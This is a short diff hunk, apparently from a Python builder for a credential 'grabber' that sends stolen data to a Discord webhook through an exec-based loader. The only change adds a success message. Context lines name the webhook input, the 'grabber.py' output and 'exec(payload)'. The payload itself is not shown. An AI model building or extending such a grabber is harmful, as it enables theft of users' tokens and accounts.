@@ -144,6 +144,7 @@ exec(payload)
     return loader_code
 
 if __name__ == "__main__":
+    print("Loaded succesfully!")
     webhook = input("Enter your Discord webhook URL: ").strip()
     filename = input("Enter output filename (e.g., grabber.py): ").strip()
 
